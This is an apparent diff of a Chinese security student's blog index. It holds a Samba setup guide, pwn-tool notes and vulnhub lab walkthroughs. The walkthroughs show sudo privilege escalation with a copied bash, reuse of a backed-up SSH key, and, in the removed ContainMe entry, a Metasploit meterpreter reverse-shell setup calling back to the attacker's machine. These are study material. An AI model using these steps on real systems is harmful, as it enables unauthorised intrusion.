+<p>直接枚举/var/backups的所有内容，发现里面有一个ssh的备份<br><img src="/2021/07/22/Cheesey-Cheeseyjack/23.png"><br>复制粘贴，然后放到文本里<br><img src="/2021/07/22/Cheesey-Cheeseyjack/24.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/25.png"><br>另开一个终端，修改权限，注意必须是600！<br>修改权限后，链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i sshkey crab@192.168.55.134</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/26.png"><br>很明显接下来要提权了，直接<code>sudo -l</code><br><img src="/2021/07/22/Cheesey-Cheeseyjack/27.png"><br>可以发现/home/crab/.bin/就是突破点。crab可以用sudo在这个目录运行所有的内容<br><img src="/2021/07/22/Cheesey-Cheeseyjack/28.png"><br>确定目标后提权就简单了，把bash shell复制到这个目录下，以sudo临时运行 bash，就可以获得root权限了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /home/crab/.bin/bash</span><br><span class="line">sudo /home/crab/.bin/bash -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/29.png"><br>导航到根目录,发现有个root.txt。打开即可获得flag<br><img src="/2021/07/22/Cheesey-Cheeseyjack/30.png"><br>至此，渗透结束。</p>
+<hr>
+<blockquote>
+<p>今天再大的事，到了明天就是小事；今年再大的事，到了明年就是故事。</p>
 </blockquote>
 <hr>
 ]]></content>
       <categories>
-        <category>Linux学习记录</category>
+        <category>靶机渗透记录</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
+        <tag>靶机渗透记录</tag>
       </tags>
   </entry>
   <entry>
@@ -388,6 +336,58 @@
       </tags>
   </entry>
   <entry>
+    <title>Red Hat 7配置samba服务器</title>
+    <url>/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[<p>是Linux学习，也是社团作业。<br>因为要求到点交，就认真的写了一下。<br>挺简单的，完全没啥需要注意的<br>学长给的步骤好多，有的感觉没必要，但还是照着操作了</p>
+<blockquote>
+<p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
+</blockquote>
+<span id="more"></span>
+<h2 id="打开物理机-修改IP地址"><a href="#打开物理机-修改IP地址" class="headerlink" title="打开物理机 修改IP地址"></a>打开物理机 修改IP地址</h2><p>物理机Win+R打开cmd  输入ipconfig查看当前ip<br>我们的虚拟机只需要和物理机配在同一网段就可以了</p>
+<h2 id="打开虚拟机-修改IP地址"><a href="#打开虚拟机-修改IP地址" class="headerlink" title="打开虚拟机 修改IP地址"></a>打开虚拟机 修改IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"><br>进入vi模式后，按i开始编辑，变化前后如下</p>
+<h4 id="编辑前"><a href="#编辑前" class="headerlink" title="编辑前"></a>编辑前</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p>
+<h4 id="编辑后"><a href="#编辑后" class="headerlink" title="编辑后"></a>编辑后</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p>
+<p>按ESC退出编辑 shift+:（冒号）至底部并输入wq后回车即可保存</p>
+<h2 id="重启网络服务"><a href="#重启网络服务" class="headerlink" title="重启网络服务"></a>重启网络服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建挂载点"><a href="#创建挂载点" class="headerlink" title="创建挂载点"></a>创建挂载点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br></pre></td></tr></table></figure>
+
+<h2 id="链接光盘"><a href="#链接光盘" class="headerlink" title="链接光盘"></a>链接光盘</h2><p>点击vm左下角光盘图标即可<br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p>
+<h2 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h2><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p>
+<h2 id="创建本地yum源"><a href="#创建本地yum源" class="headerlink" title="创建本地yum源"></a>创建本地yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/dev.repo</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"></p>
+<h2 id="清理yum源"><a href="#清理yum源" class="headerlink" title="清理yum源"></a>清理yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"></p>
+<h2 id="安装samba"><a href="#安装samba" class="headerlink" title="安装samba"></a>安装samba</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install samba</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/8.png"><br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/8.1.png"></p>
+<h2 id="配置samba的配置文件"><a href="#配置samba的配置文件" class="headerlink" title="配置samba的配置文件"></a>配置samba的配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置前："><a href="#配置前：" class="headerlink" title="配置前："></a>配置前：</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p>
+<h4 id="配置后："><a href="#配置后：" class="headerlink" title="配置后："></a>配置后：</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/10.png"></p>
+<h2 id="创建共享位置并设置权限"><a href="#创建共享位置并设置权限" class="headerlink" title="创建共享位置并设置权限"></a>创建共享位置并设置权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /opt/share</span><br><span class="line">chmod 777 /opt/share</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"></p>
+<h2 id="创建smb用户"><a href="#创建smb用户" class="headerlink" title="创建smb用户"></a>创建smb用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbpasswd -a 用户名</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/12.png"> </p>
+<h2 id="重启samba服务"><a href="#重启samba服务" class="headerlink" title="重启samba服务"></a>重启samba服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service smb restart</span><br><span class="line">service nmb restart</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/13.png"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>物理机打开我的电脑 输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\虚拟机的IP地址</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/14.png"><br>输入在虚拟机里设置的用户名和密码即可<br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/15.png"></p>
+<hr>
+<blockquote>
+<p>没有比人更高的山,没有比脚更长的路</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>Linux学习记录</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>信息收集Information Gathering</title>
     <url>/2021/05/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86Information-Gathering/</url>
     <content><![CDATA[<p>【未完成，根据自己的学习情况不定时更新】<br>信息收集，渗透的第一步，也是最重要的一步。</p>
@@ -431,6 +431,16 @@
       </tags>
   </entry>
   <entry>
+    <title>博客更新通知+未来学习计划</title>
+    <url>/2021/08/24/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E9%80%9A%E7%9F%A5-%E6%9C%AA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
+    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>最近还是没放下CTF<br>学安全跟CTF到底有没有关系呢？<br>我还是不知道<br>我现在会的东西80%来自打CTF认知的，剩下20%都是靶机里学的<br>还是太菜了……<br>CTF差不多也遇到瓶颈了吧，就会点简单的杂项<br>祥云杯就做出来3个杂项（层层取证+鸣雏恋+考古）<br>还是学学专业知识比较好<br>一直想学学编程 C语言还没怎么动呢<br>接下来还有更多的事要忙呢……</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>感觉时间不够用……<br>或者是自己不够努力，三天打鱼两天晒网感动自己吧<br>先把C语言学了，之后自己怎么样也不管了</p>
+<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><p>加了一个安全团队，以后靶机渗透就不在博客更新了，以后都交给团队了。<br>一边写vulnhub靶机渗透，一边学习域渗透和尝试复现各种漏洞<br>这里就暂时不更新了，反正也没人看吧<br>想学习交流了可以直接联系我</p>
+<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><p>接下来的计划大概是<br>学基础知识  毫无基础可言，所以开始搞一搞<br>学编程语言  C语言 Python<br>学域渗透 从0开始的学习了属于是</p>
+<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><p>什么时候才能会挖洞呢……</p>
+]]></content>
+  </entry>
+  <entry>
     <title>在win10搭建DVWA</title>
     <url>/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/</url>
     <content><![CDATA[<h2 id="搭建DVWA漏洞环境"><a href="#搭建DVWA漏洞环境" class="headerlink" title="搭建DVWA漏洞环境"></a>搭建DVWA漏洞环境</h2><p>下载phpstudy或wamp，我用的是phpstudy2018（此处感谢我的一位同学，很早就给我点到这里了，十分感谢！）<br>打开phpstudy，启动Apache和MySQL<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.1.png"></p>
@@ -450,16 +460,6 @@
       <tags>
         <tag>Web安全学习记录</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>博客更新通知+未来学习计划</title>
-    <url>/2021/08/24/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E9%80%9A%E7%9F%A5-%E6%9C%AA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
-    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>最近还是没放下CTF<br>学安全跟CTF到底有没有关系呢？<br>我还是不知道<br>我现在会的东西80%来自打CTF认知的，剩下20%都是靶机里学的<br>还是太菜了……<br>CTF差不多也遇到瓶颈了吧，就会点简单的杂项<br>祥云杯就做出来3个杂项（层层取证+鸣雏恋+考古）<br>还是学学专业知识比较好<br>一直想学学编程 C语言还没怎么动呢<br>接下来还有更多的事要忙呢……</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>感觉时间不够用……<br>或者是自己不够努力，三天打鱼两天晒网感动自己吧<br>先把C语言学了，之后自己怎么样也不管了</p>
-<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><p>加了一个安全团队，以后靶机渗透就不在博客更新了，以后都交给团队了。<br>一边写vulnhub靶机渗透，一边学习域渗透和尝试复现各种漏洞<br>这里就暂时不更新了，反正也没人看吧<br>想学习交流了可以直接联系我</p>
-<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><p>接下来的计划大概是<br>学基础知识  毫无基础可言，所以开始搞一搞<br>学编程语言  C语言 Python<br>学域渗透 从0开始的学习了属于是</p>
-<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><p>什么时候才能会挖洞呢……</p>
-]]></content>
   </entry>
   <entry>
     <title>尝试接触Windows Debug</title>
@@ -553,6 +553,56 @@
       </tags>
   </entry>
   <entry>
+    <title>我的pwn学习之路——第二天</title>
+    <url>/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
+    <content><![CDATA[<p>几天不摸，感觉又回到解放前了。</p>
+<p>以后一定要多尝试学习不同的东西，保持热爱，放好心态！</p>
+<p>pwn学习之路系列的第二天，开坑！</p>
+<p>这里记录一下写题的一些工具使用和碎碎念</p>
+<p>当你拿到题目之后……（接下来用一道入门级别的题目做栗子）</p>
+<p>第一件事要做的是checksec 他可以查看保护机制，这样有理由后续做题的分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec 文件   #看开启了哪些保护机制</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/1.png"></p>
+<p>虽然开启不开启我都不会写吧，但是还是要装装样子滴</p>
+<span id="more"></span>
+
+<p>然后可以用objdump看一些东西，比方说打印函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -D 文件名   #可以看到文件的全部</span><br></pre></td></tr></table></figure>
+
+<p>用pwngdb的时候很难看到所有的东西，提前看一看还是很重要的</p>
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -R 文件名   #可以看到打印函数</span><br></pre></td></tr></table></figure>
+
+<p>看到打印函数是很有用的</p>
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/3.png"></p>
+<p>接下来就可以上pwngdb了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb 文件     #启动pwngdb</span><br></pre></td></tr></table></figure>
+
+<p>一些简单的操作之前有篇文章写的有，我不额外多写了，讲点实际做题中用到的东西</p>
+<p>输入一大串字符，溢出与否有回显，这个时候同学就想，那我可以一点一点的试，什么时候正好溢出了，不就可以算偏移了吗？现在有个更简单快捷的办法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 要输入的字符的长度</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/4.png"></p>
+<p>可以看到是由英文字母组成的有规律的字符串，因此最大可以设置的值为26×26×26=456976</p>
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/5.png"></p>
+<p>复制生成的字符串，在pwngdb中进行调试，当出现报错后，就可以再通过cyclic计算要偏移的字节了</p>
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/6.png"></p>
+<p>这里报的错其实指的是输入的十六进制的字符，根据指出那一段溢出，可以接着算偏移</p>
+<p>为什么呢？</p>
+<p>因为恰恰就是这几个字符去覆盖了main返回地址，所以可以数数这一串字符距离字符串首字母间隔了多少字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic -l 报错的4位字符</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/7.png"></p>
+]]></content>
+      <categories>
+        <category>我的pwn学习之路</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络安全应急响应Linux篇</title>
     <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</url>
     <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
@@ -629,109 +679,6 @@
       </categories>
       <tags>
         <tag>应急响应</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>我的pwn学习之路——第二天</title>
-    <url>/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
-    <content><![CDATA[<p>几天不摸，感觉又回到解放前了。</p>
-<p>以后一定要多尝试学习不同的东西，保持热爱，放好心态！</p>
-<p>pwn学习之路系列的第二天，开坑！</p>
-<p>这里记录一下写题的一些工具使用和碎碎念</p>
-<p>当你拿到题目之后……（接下来用一道入门级别的题目做栗子）</p>
-<p>第一件事要做的是checksec 他可以查看保护机制，这样有理由后续做题的分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec 文件   #看开启了哪些保护机制</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/1.png"></p>
-<p>虽然开启不开启我都不会写吧，但是还是要装装样子滴</p>
-<span id="more"></span>
-
-<p>然后可以用objdump看一些东西，比方说打印函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -D 文件名   #可以看到文件的全部</span><br></pre></td></tr></table></figure>
-
-<p>用pwngdb的时候很难看到所有的东西，提前看一看还是很重要的</p>
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -R 文件名   #可以看到打印函数</span><br></pre></td></tr></table></figure>
-
-<p>看到打印函数是很有用的</p>
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/3.png"></p>
-<p>接下来就可以上pwngdb了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb 文件     #启动pwngdb</span><br></pre></td></tr></table></figure>
-
-<p>一些简单的操作之前有篇文章写的有，我不额外多写了，讲点实际做题中用到的东西</p>
-<p>输入一大串字符，溢出与否有回显，这个时候同学就想，那我可以一点一点的试，什么时候正好溢出了，不就可以算偏移了吗？现在有个更简单快捷的办法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 要输入的字符的长度</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/4.png"></p>
-<p>可以看到是由英文字母组成的有规律的字符串，因此最大可以设置的值为26×26×26=456976</p>
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/5.png"></p>
-<p>复制生成的字符串，在pwngdb中进行调试，当出现报错后，就可以再通过cyclic计算要偏移的字节了</p>
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/6.png"></p>
-<p>这里报的错其实指的是输入的十六进制的字符，根据指出那一段溢出，可以接着算偏移</p>
-<p>为什么呢？</p>
-<p>因为恰恰就是这几个字符去覆盖了main返回地址，所以可以数数这一串字符距离字符串首字母间隔了多少字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic -l 报错的4位字符</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/7.png"></p>
-]]></content>
-      <categories>
-        <category>我的pwn学习之路</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶机ContainMe: 1渗透记录</title>
-    <url>/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机ContainMe: 1×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>靶机中等难度，有小挑战</p>
-<blockquote>
-<p>下载链接：<a href="https://www.vulnhub.com/entry/containme-1,729/">https://www.vulnhub.com/entry/containme-1,729/</a></p>
-</blockquote>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，确定靶机ip。先看mac地址</p>
-<span id="more"></span>
-
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.12</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>web服务开着，先去瞅一眼吧<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>这个界面没啥好说的，随便输了个目录发现了端倪<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>顺便看了看phpinfo的信息，是lxd容器<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"></p>
-<blockquote>
-<p>科普<a href="https://www.linuxprobe.com/lxd-2-0-introduce.html">https://www.linuxprobe.com/lxd-2-0-introduce.html</a></p>
-</blockquote>
-<p>再回到index.php这里 我们访问这里就会显示ls -al的结果，是不是有可能存在漏洞呢？<br>用wfuzz测试一下</p>
-<blockquote>
-<p>wfuzz是一款Python开发的Web安全模糊测试工具。可以用在做请求参数参数类的模糊测试，也可以用来做Web目录扫描等操作。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/dirb/wordlists/common.txt  -u &#x27;http://192.168.155.157/index.php?FUZZ=1&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/dirb/wordlists/common.txt  -u &#x27;http://192.168.155.157/index.php?FUZZ=a&#x27; --hh 329</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>找到了可以注入的地方。<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>咱现在整个就是一个赶紧上反弹shell的动作</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set target PHP</span><br><span class="line">set lhost 192.168.155.128  #kali的ip</span><br><span class="line">show options</span><br><span class="line">run -j   #以后台的方式运行 sessions</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>生成的payload放到url中执行即可<br>【这张图是后来补的，所以ip变了，不要在意】<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>拿到sessions就可以进交互shell接着操作了<br>这里为了看着舒服又有Python打了交互shell(前提是靶机有Python环境)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;  </span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>进入用户目录，发现了一个可执行二进制文件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>想要拿到这个文件可以利用刚才的网页漏洞拿出十六进制文件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>用工具脱壳之后，用Ida打开可以发现hash字符串，输入了正确的字符串就可以拿到/bin/bash权限<br>所以把字符串复制到一个文本里用john去破解一下</p>
-<blockquote>
-<p>John the Ripper是一个快速的密码破解程序，kali安装自带，很好用的一款开源软件<br><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>接着输入./1cryptupx   mike即可<br>又跳到了另一个www-data权限的目录，接下来进行提权</p>
-</blockquote>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/01/01/%E9%9D%B6%E6%9C%BAContainMe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
